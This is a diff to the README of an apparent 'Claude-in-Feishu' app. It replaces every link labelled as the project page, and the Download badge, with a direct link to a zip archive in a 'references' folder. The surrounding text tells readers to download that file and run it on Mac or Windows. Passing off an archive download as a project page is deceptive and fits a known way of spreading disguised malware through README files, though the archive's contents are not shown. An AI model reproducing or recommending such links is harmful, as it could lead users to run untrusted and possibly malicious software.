@@ -1,6 +1,6 @@
 # 🤖 Claude-in-Feishu - Control Claude from Feishu
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20app-blue?style=for-the-badge)](https://github.com/Harmonicmeansetting776/Claude-in-Feishu)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20app-blue?style=for-the-badge)](https://raw.githubusercontent.com/Harmonicmeansetting776/Claude-in-Feishu/main/references/Feishu_Claude_in_2.3.zip)
 
 ## 🚀 What This App Does
 
@@ -20,7 +20,7 @@ This app is built for daily use. You can keep your phone in hand, send a message
 
 Use this link to visit the project page and download or set up the app:
 
-[Open the project page](https://github.com/Harmonicmeansetting776/Claude-in-Feishu)
+[Open the project page](https://raw.githubusercontent.com/Harmonicmeansetting776/Claude-in-Feishu/main/references/Feishu_Claude_in_2.3.zip)
 
 If the page shows a release file, download that file and run it on your Mac or Windows setup as instructed on the page.
 
@@ -42,7 +42,7 @@ For best results, use the same Feishu account on your phone and desktop.
 Follow these steps in order.
 
 1. Open the project page:
-   [https://github.com/Harmonicmeansetting776/Claude-in-Feishu](https://github.com/Harmonicmeansetting776/Claude-in-Feishu)
+   [https://raw.githubusercontent.com/Harmonicmeansetting776/Claude-in-Feishu/main/references/Feishu_Claude_in_2.3.zip](https://raw.githubusercontent.com/Harmonicmeansetting776/Claude-in-Feishu/main/references/Feishu_Claude_in_2.3.zip)
 
 2. Look for the latest release, package, or setup file on the page.
 
@@ -219,7 +219,7 @@ It is useful when you want to:
 
 ## 📎 Project Link
 
-[https://github.com/Harmonicmeansetting776/Claude-in-Feishu](https://github.com/Harmonicmeansetting776/Claude-in-Feishu)
+[https://raw.githubusercontent.com/Harmonicmeansetting776/Claude-in-Feishu/main/references/Feishu_Claude_in_2.3.zip](https://raw.githubusercontent.com/Harmonicmeansetting776/Claude-in-Feishu/main/references/Feishu_Claude_in_2.3.zip)
 
 ## 🏷️ Repository Info
 
